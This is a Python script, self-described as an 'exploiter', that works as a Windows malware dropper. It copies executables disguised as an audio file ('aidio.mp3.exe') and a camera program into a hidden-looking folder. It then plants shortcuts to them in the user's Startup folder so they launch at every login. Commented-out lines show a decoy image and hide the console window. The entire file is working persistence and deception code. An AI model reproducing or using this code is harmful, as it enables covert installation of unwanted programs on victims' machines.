#This exploiter created by Sachin M


import getpass
import os
#import ctypes
from win32com.client import Dispatch
import base64
#import time
#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

username = getpass.getuser()
start = 'Start Menu'
def encodes(filename,p):
	file0 = open(filename,"rb")
	file1 = file0.read()
	file0.close()
	
	x = base64.b64encode(file1)
	y = base64.b64decode(x)
	

	z = p+'\\'+filename
	file = open(z,"wb")
	file.write(y)
	file.close()

def startup(x,y,z):
	ff = open(x,'rb')
	ff2 = ff.read()
	ff.close()
	
	sa = base64.b64encode(ff2)
	sw = base64.b64decode(sa)
	
	path5 = "C:\\Users\\"+y+"\\AppData\\Roaming\\Microsoft\\Windows\\"+z+"\\Programs\\Startup"
	position = os.getcwd()

	os.chdir(path5)

	fg = open(x,'wb')
	fg.write(sw)
	fg.close()
	
	os.chdir(position)
	

#photo=''''''



#decode = base64.b64decode(photo)



#filles = open("girl.jpg","wb")
#filles.write(decode)
#filles.close()

#if os.path.exists("girl.jpg"):
	#os.system("start girl.jpg")




#os.system("attrib -s -h aidio.mp3.exe")
#os.system("attrib -s -h aidio.mp3_short.lnk")
#os.system("attrib -s -h test_short.lnk")
#os.system("attrib -s -h test.exe")

if not os.path.exists("aidio.mp3_short.lnk"):
	path1234 = os.path.join("aidio.mp3_short.lnk")
	target = r"C:\\songs\\aidio.mp3.exe"
	wDir = r"C:\\songs"
	iconn = r"C:\\songs\\aidio.mp3.exe"
 
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path1234)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.IconLocation = iconn
	shortcut.save()

if not os.path.exists("test_short.lnk"):
	path1235 = os.path.join("test_short.lnk")
	target = r"C:\\songs\\test.exe"
	wDir = r"C:\\songs"
	iconn = r"C:\\songs\\test.exe"
 
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path1235)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.IconLocation = iconn
	shortcut.save()



path1 = "C:\\songs"

if not os.path.exists(path1):
	os.system("mkdir C:\\songs")

path2 = "C:\\songs\\aidio.mp3.exe"

if not os.path.exists(path2):

	#os.system("copy aidio.mp3.exe C:\\songs")
	encodes('aidio.mp3.exe','C:\\songs')

path3 = "C:\\songs\\aidio.mp3_short.lnk"

if not os.path.exists(path3):
	#os.system("copy aidio.mp3_short.lnk C:\\songs")
	encodes('aidio.mp3_short.lnk','C:\\songs')
path10 = "C:\\songs\\test.exe"

if not os.path.exists(path10):
	#os.system("copy test.exe C:\\songs")
	encodes('test.exe','C:\\songs')

path11 = "C:\\songs\\test_short.lnk"

if not os.path.exists(path11):
	#os.system("copy test_short.lnk C:\\songs")
	encodes('test_short.lnk','C:\\songs')
path12 = "C:\\songs\\12camera.exe"

if not os.path.exists(path12):
	#os.system("copy 12camera.exe C:\\songs")
	encodes('12camera.exe','C:\\songs')


path4 = "C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\"+start+"\\Programs\\Startup\\aidio.mp3_short.lnk"


#time.sleep(1)
#os.system("copy aidio.mp3_short.lnk "+path5+">NUL")
#encodes('aidio.mp3_short.lnk',path5)
#time.sleep(1)
#os.system("copy test_short.lnk "+path5+">NUL")
#encodes('test_short.lnk',path5)



startup('aidio.mp3_short.lnk',username,start)
startup('test_short.lnk',username,start)


